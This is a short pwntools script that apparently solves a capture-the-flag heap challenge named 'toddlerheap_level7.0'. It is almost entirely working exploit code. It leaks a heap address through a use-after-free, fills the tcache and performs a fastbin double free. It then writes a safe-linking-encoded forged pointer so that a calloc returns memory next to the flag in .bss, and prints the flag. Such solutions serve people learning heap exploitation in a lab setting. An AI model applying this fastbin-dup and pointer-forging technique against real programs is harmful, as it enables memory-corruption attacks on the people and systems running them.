# idea: fastbin_dup_into_stack, this time cant directly write to .bss before flag, but calloc command writes the size into .bss. Just need to figure out the right combination of #chunk and chunk size

from pwn import *
context.arch = 'amd64'

p = process("/challenge/toddlerheap_level7.0")

malloc_size = 0x18
global_to_flag_offset = 0x28
p.recvuntil(b"Reading the flag into ")
flag_loc = int(p.recvuntil(b'.')[:-1], 16)
print(f'flag_loc = {hex(flag_loc)}')

p.sendline(f"calloc 17 {malloc_size}")
p.sendline(f"free 17")
p.sendline(b"puts 17")
p.recvuntil(b"Data: ")
leak = p.recvuntil(b"\n")[:-1]
heap_leak = unpack(leak, 'all')
print(f'heap_leak = {hex(heap_leak)}')

for idx in range(7):
    p.sendline(f"calloc {idx} {malloc_size}")
for idx in range(7):
    p.sendline(f"free {idx}")

p.sendline(f"calloc 4 {malloc_size}")
p.sendline(f"calloc 17 {malloc_size}")
p.sendline(b"free 4")
p.sendline(b"free 17")
p.sendline(b"free 4")

p.sendline(f"calloc 10 {malloc_size}")
p.sendline(f"calloc 17 {malloc_size}")

# write 0x20 into the right place by calloc 0x20
p.sendline(b"calloc 10 32")

# alloc to global
p.sendline("safer_read")
p.sendline(b"4")
p.sendline(p64(heap_leak ^ (flag_loc - global_to_flag_offset)))
p.sendline(f"calloc 17 {malloc_size}")
print(f'target = {hex(flag_loc - global_to_flag_offset)}')
p.sendline(f"calloc 6 {malloc_size}")

# fill the calloc'ed chunk with A's and print flag
p.sendline(b"safer_read 6")
p.send(b'A'*24)
p.sendline(b"puts 6")

print(p.recv().decode())